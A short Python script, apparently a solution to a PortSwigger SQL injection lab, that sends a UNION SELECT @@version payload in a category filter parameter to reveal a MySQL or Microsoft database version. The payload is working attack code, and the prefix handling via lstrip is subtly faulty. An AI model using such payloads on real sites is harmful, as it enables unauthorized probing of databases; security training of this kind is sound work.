"""
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

category_string = f"Gifts' UNION SELECT @@version, null -- "
url = f'https://{site}/filter?category={category_string}'
resp = s.get(url)